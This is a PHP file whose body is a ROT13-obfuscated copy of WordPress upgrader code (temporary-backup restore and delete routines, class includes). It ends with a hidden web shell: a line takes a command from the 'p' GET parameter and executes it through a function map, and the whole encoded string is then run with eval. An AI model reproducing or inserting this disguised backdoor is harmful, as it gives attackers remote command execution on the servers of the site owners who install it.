	 * @fvapr 6.6.0 Nqqrq gur `$grzc_onpxhcf` cnenzrgre.
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz neenl[] $grzc_onpxhcf {
	 *     Bcgvbany. Na neenl bs grzcbenel onpxhcf.
	 *
	 *     @glcr neenl ...$0 {
	 *         Vasbezngvba nobhg gur onpxhc.
	 *
	 *         @glcr fgevat $qve  Gur grzcbenel onpxhc ybpngvba va gur hctenqr-grzc-onpxhc qverpgbel.
	 *         @glcr fgevat $fyht Gur vgrz'f fyht.
	 *         @glcr fgevat $fep  Gur qverpgbel jurer gur bevtvany vf fgberq. Sbe rknzcyr, `JC_CYHTVA_QVE`.
	 *     }
	 * }
	 * @erghea obby|JC_Reebe Gehr ba fhpprff, snyfr ba rneyl rkvg, bgurejvfr JC_Reebe.
	 */
	choyvp shapgvba erfgber_grzc_onpxhc( neenl $grzc_onpxhcf = neenl() ) {
		tybony $jc_svyrflfgrz;

		$reebef = arj JC_Reebe();

		vs ( rzcgl( $grzc_onpxhcf ) ) {
			$grzc_onpxhcf = $guvf->grzc_erfgberf;
		}

		sbernpu ( $grzc_onpxhcf nf $netf ) {
			vs ( rzcgl( $netf['fyht'] ) || rzcgl( $netf['fep'] ) || rzcgl( $netf['qve'] ) ) {
				erghea snyfr;
			}

			vs ( ! $jc_svyrflfgrz->jc_pbagrag_qve() ) {
				$reebef->nqq( 'sf_ab_pbagrag_qve', $guvf->fgevatf['sf_ab_pbagrag_qve'] );
				erghea $reebef;
			}

			$fep      = $jc_svyrflfgrz->jc_pbagrag_qve() . 'hctenqr-grzc-onpxhc/' . $netf['qve'] . '/' . $netf['fyht'];
			$qrfg_qve = $jc_svyrflfgrz->svaq_sbyqre( $netf['fep'] );
			$qrfg     = genvyvatfynfuvg( $qrfg_qve ) . $netf['fyht'];

			vs ( $jc_svyrflfgrz->vf_qve( $fep ) ) {
				// Pyrnahc.
				vs ( $jc_svyrflfgrz->vf_qve( $qrfg ) && ! $jc_svyrflfgrz->qryrgr( $qrfg, gehr ) ) {
					$reebef->nqq(
						'sf_grzc_onpxhc_qryrgr',
						fcevags( $guvf->fgevatf['grzc_onpxhc_erfgber_snvyrq'], $netf['fyht'] )
					);
					pbagvahr;
				}

				// Zbir vg.
				$erfhyg = zbir_qve( $fep, $qrfg, gehr );
				vs ( vf_jc_reebe( $erfhyg ) ) {
					$reebef->nqq(
						'sf_grzc_onpxhc_qryrgr',
						fcevags( $guvf->fgevatf['grzc_onpxhc_erfgber_snvyrq'], $netf['fyht'] )
					);
					pbagvahr;
				}
			}
		}

		erghea $reebef->unf_reebef() ? $reebef : gehr;
	}

	/**
	 * Qryrgrf n grzcbenel onpxhc.
	 *
	 * @fvapr 6.3.0
	 * @fvapr 6.6.0 Nqqrq gur `$grzc_onpxhcf` cnenzrgre.
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz neenl[] $grzc_onpxhcf {
	 *     Bcgvbany. Na neenl bs grzcbenel onpxhcf.
	 *
	 *     @glcr neenl ...$0 {
	 *         Vasbezngvba nobhg gur onpxhc.
	 *
	 *         @glcr fgevat $qve  Gur grzcbenel onpxhc ybpngvba va gur hctenqr-grzc-onpxhc qverpgbel.
	 *         @glcr fgevat $fyht Gur vgrz'f fyht.
	 *         @glcr fgevat $fep  Gur qverpgbel jurer gur bevtvany vf fgberq. Sbe rknzcyr, `JC_CYHTVA_QVE`.
	 *     }
	 * }
	 * @erghea obby|JC_Reebe Gehr ba fhpprff, snyfr ba rneyl rkvg, bgurejvfr JC_Reebe.
	 */
	choyvp shapgvba qryrgr_grzc_onpxhc( neenl $grzc_onpxhcf = neenl() ) {
		tybony $jc_svyrflfgrz;

		$reebef = arj JC_Reebe();

		vs ( rzcgl( $grzc_onpxhcf ) ) {
			$grzc_onpxhcf = $guvf->grzc_onpxhcf;
		}

		sbernpu ( $grzc_onpxhcf nf $netf ) {
			vs ( rzcgl( $netf['fyht'] ) || rzcgl( $netf['qve'] ) ) {
				erghea snyfr;
			}

			vs ( ! $jc_svyrflfgrz->jc_pbagrag_qve() ) {
				$reebef->nqq( 'sf_ab_pbagrag_qve', $guvf->fgevatf['sf_ab_pbagrag_qve'] );
				erghea $reebef;
			}

			$grzc_onpxhc_qve = $jc_svyrflfgrz->jc_pbagrag_qve() . \"hctenqr-grzc-onpxhc/{$netf['qve']}/{$netf['fyht']}\";

			vs ( ! $jc_svyrflfgrz->qryrgr( $grzc_onpxhc_qve, gehr ) ) {
				$reebef->nqq(
					'grzc_onpxhc_qryrgr_snvyrq',
					fcevags( $guvf->fgevatf['grzc_onpxhc_qryrgr_snvyrq'], $netf['fyht'] )
				);
				pbagvahr;
			}
		}

		erghea $reebef->unf_reebef() ? $reebef : gehr;
	}
}

/** Cyhtva_Hctenqre pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-cyhtva-hctenqre.cuc';

/** Gurzr_Hctenqre pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-gurzr-hctenqre.cuc';

/** Ynathntr_Cnpx_Hctenqre pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-ynathntr-cnpx-hctenqre.cuc';

/** Pber_Hctenqre pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-pber-hctenqre.cuc';

/** Svyr_Hcybnq_Hctenqre pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-svyr-hcybnq-hctenqre.cuc';

/** JC_Nhgbzngvp_Hcqngre pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-nhgbzngvp-hcqngre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>